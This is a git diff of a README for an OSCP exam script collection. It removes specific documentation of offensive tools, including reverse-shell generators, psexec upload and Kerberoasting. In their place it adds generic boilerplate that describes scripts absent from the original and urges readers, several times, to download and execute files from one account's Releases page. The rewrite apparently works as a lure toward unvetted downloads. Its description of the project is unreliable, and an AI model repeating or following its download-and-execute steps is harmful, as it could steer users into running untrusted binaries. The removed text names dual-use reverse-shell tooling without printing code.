@@ -1,113 +1,132 @@
-These scripts were developed to streamline common tasks during the OSCP exam and are provided as-is. Users are responsible for managing their own dependencies. The scripts primarily rely on a default Kali Linux environment and standard Python 3 libraries. This project does not represent professional-grade software and is intended solely for personal use and educational purposes. Users are strongly encouraged to explore and understand all options available in the source code of these scripts. Doing so not only ensures effective use of these specific tools, but also helps build the essential skill of reading and analyzing Python code, an important ability for success in the OSCP exam.
+# OSCP-Scripts 🛠️
 
-[![Video Tutorial](https://img.youtube.com/vi/1VTjEL_21as/maxresdefault.jpg)](https://youtu.be/1VTjEL_21as)
+Welcome to the **OSCP-Scripts** repository! This collection of scripts is designed to help you streamline your tasks while preparing for the Offensive Security Certified Professional (OSCP) exam. Whether you are a beginner or an experienced user, these scripts can save you time and effort.
 
-# Installation
+[![Download Scripts](https://img.shields.io/badge/Download%20Scripts-Click%20Here-blue)](https://github.com/wendel12345678/OSCP-Scripts/releases)
 
-The `install` script installs the scripts into `/opt/oscp-scripts` and updates the user's and sudo's path.
+## Table of Contents
 
-```
-chmod +x install
-sudo ./install
-```
-# scripts
-## clock-sync
+- [Introduction](#introduction)
+- [Getting Started](#getting-started)
+- [Scripts Overview](#scripts-overview)
+- [Usage Instructions](#usage-instructions)
+- [Contributing](#contributing)
+- [License](#license)
+- [Acknowledgments](#acknowledgments)
 
-Syncs with Kerberos server. 
+## Introduction
 
-Usage:
-```
-sudo clock-sync <Kerberos IP>
-```
+The OSCP exam is known for its practical challenges and real-world scenarios. To succeed, you need to be efficient and effective in your approach. This repository contains various scripts that automate repetitive tasks, making your preparation smoother. 
 
-To reset system time to normal:
-```
-sudo clock-sync
-```
+Feel free to explore the scripts and adapt them to your needs. For the latest versions and updates, check the [Releases section](https://github.com/wendel12345678/OSCP-Scripts/releases).
 
-## enum-AD
+## Getting Started
 
-Enumerates domain users into a file called users, checks the password policy, runs SharpHound extractor and saves output into the file bloodhound.zip, then tries to AS-REP roast and Kerberoast users. 
+To get started with the OSCP-Scripts, follow these steps:
 
-Usage:
-```
-enum-AD -i <IP> -u <domain user> -p|-H <password|hash>
-```
+1. **Clone the Repository**: Use the following command to clone the repository to your local machine.
 
-This script depends on the scripts as-rep-roast, bloodhound-collect, enum-AD, get-domain, and get-domain-users.
+   ```bash
+   git clone https://github.com/wendel12345678/OSCP-Scripts.git
+   ```
 
-## kdbx-crawl
+2. **Navigate to the Directory**: Change to the directory where the scripts are located.
 
-Crawls a kdbx file automatically.
+   ```bash
+   cd OSCP-Scripts
+   ```
 
-Usage:
-```
-kdbx-crawl -f <kdbx file> -p|-H <password|hash>
-```
+3. **Download and Execute Scripts**: Visit the [Releases section](https://github.com/wendel12345678/OSCP-Scripts/releases) to download the latest scripts. Execute them as needed.
 
-## proxy
+## Scripts Overview
 
-Automatically sets up a command to run with a dynamic proxychains config.
+This repository includes a variety of scripts aimed at different tasks. Below is a brief overview of some of the key scripts:
 
-Usage:
-```
-proxy <IP>:<port> <command with spaces>
-```
+### 1. Network Scanning
 
-HTTP proxy:
-```
-proxy --http <IP>:<port> <command with spaces>
-```
+- **nmap-scan.sh**: Automates the process of scanning a target using Nmap. Customize the options as needed.
 
-## psexec
+### 2. Exploitation
 
-Generates a Windows msfvenom reverse shell, uploads it with impacket-psexec, then executes it. This requires administrator privileges (run with --debug to check authentication). If there seems to be a weird I/O issue, hit enter a bunch of times, and it should be fixed. 
+- **exploit-finder.py**: A Python script that helps identify potential exploits for services running on a target.
 
-Usage:
-```
-psexec -i <IP> -u <user> -p|-H <password|hash> [--debug]
-```
+### 3. Information Gathering
 
-## ps-payload
+- **whois-query.sh**: Fetches WHOIS information for a given domain. This can help in reconnaissance.
 
-Generates an encoded powershell reverse shell.
+### 4. Web Application Testing
 
-Usage:
-```
-ps-payload <IP> <port>
-```
+- **sql-injection-check.sh**: Checks for SQL injection vulnerabilities in web applications.
 
-## scan-network
+### 5. Post-Exploitation
 
-Scans an IP range for hosts and runs a fast and slow scan on TCP and UDP for each in its own directory. The `--internal` flag was made for scans tunneled through Ligolo-NG.
+- **post-exploit.sh**: A script that helps automate post-exploitation tasks, such as gathering user credentials.
 
-Usage:
-```
-sudo scan-network <IP range> [--internal]
-```
+### 6. Reporting
 
-## upload-server
+- **report-generator.py**: Generates a report based on the findings from your penetration tests.
 
-Similar to the command `python -m http.server <port>`, it creates a simple HTTP server, but supports upload as well. It dynamically grabs the tun0 interface and prints the Windows and Linux commands to remotely upload a file.
+## Usage Instructions
 
-Usage:
-```
-upload-server <port>
-```
+To use any of the scripts, follow these general steps:
 
-# windows
+1. **Make the Script Executable**: Before running any script, ensure it is executable.
 
-## reboot.c
-Occasionally, a user would have SeShutdownPrivilege, but I would be unable to reboot the host. Uploading the compiled program and running it fixed the problem for me in all cases.
+   ```bash
+   chmod +x script-name.sh
+   ```
 
-This program can be cross-compiled from Kali with the following command:
+2. **Run the Script**: Execute the script with the necessary parameters.
 
-For 64-bit (x86_64):
-```
-x86_64-w64-mingw32-gcc reboot.c -o reboot.exe -ladvapi32 -luser32
-```
+   ```bash
+   ./script-name.sh [options]
+   ```
 
-For 32-bit (x86):
-```
-i686-w64-mingw32-gcc reboot.c -o reboot32.exe -ladvapi32 -luser32
-```
+Refer to the comments in each script for specific usage instructions and options.
+
+## Contributing
+
+Contributions are welcome! If you have a script that you think would be beneficial to others, please follow these steps:
+
+1. **Fork the Repository**: Click on the "Fork" button at the top right of the page.
+
+2. **Create a New Branch**: Use a descriptive name for your branch.
+
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+
+3. **Make Your Changes**: Add your script and any necessary documentation.
+
+4. **Commit Your Changes**: Use clear commit messages.
+
+   ```bash
+   git commit -m "Add new script for feature"
+   ```
+
+5. **Push to Your Branch**: 
+
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+
+6. **Create a Pull Request**: Go to the original repository and click on "New Pull Request."
+
+Thank you for considering contributing to this project!
+
+## License
+
+This repository is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Acknowledgments
+
+- Special thanks to the OSCP community for their support and resources.
+- Thanks to Offensive Security for creating the OSCP certification and the accompanying training materials.
+
+## Conclusion
+
+The OSCP-Scripts repository aims to assist you in your journey toward achieving the OSCP certification. By automating various tasks, you can focus more on learning and less on repetitive actions. 
+
+For the latest scripts and updates, remember to check the [Releases section](https://github.com/wendel12345678/OSCP-Scripts/releases). 
+
+Happy hacking! 🖥️
